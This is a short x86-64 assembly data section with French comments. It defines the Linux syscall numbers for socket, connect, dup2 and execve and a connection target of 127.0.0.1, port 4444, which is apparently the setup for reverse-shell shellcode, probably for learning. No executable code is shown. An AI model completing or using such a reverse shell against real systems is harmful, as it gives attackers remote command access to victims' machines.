section .data
    ; Constantes pour les appels sys
    SYS_SOCKET equ 41
    SYS_CONNECT equ 42
    SYS_DUP2 equ 33
    SYS_EXECVE equ 59
    SYS_EXIT equ 60

    ; Constantes pour socket
    AF_INET equ 2
    SOCK_STREAM equ 1
    IPPROTO_IP equ 0

    ; Config de la connexion
    ip dd 0x0100007f       ; 127.0.0.1 en format réseau (little-endian)
    port dw 0x5c11         ; Port 4444 (0x115c)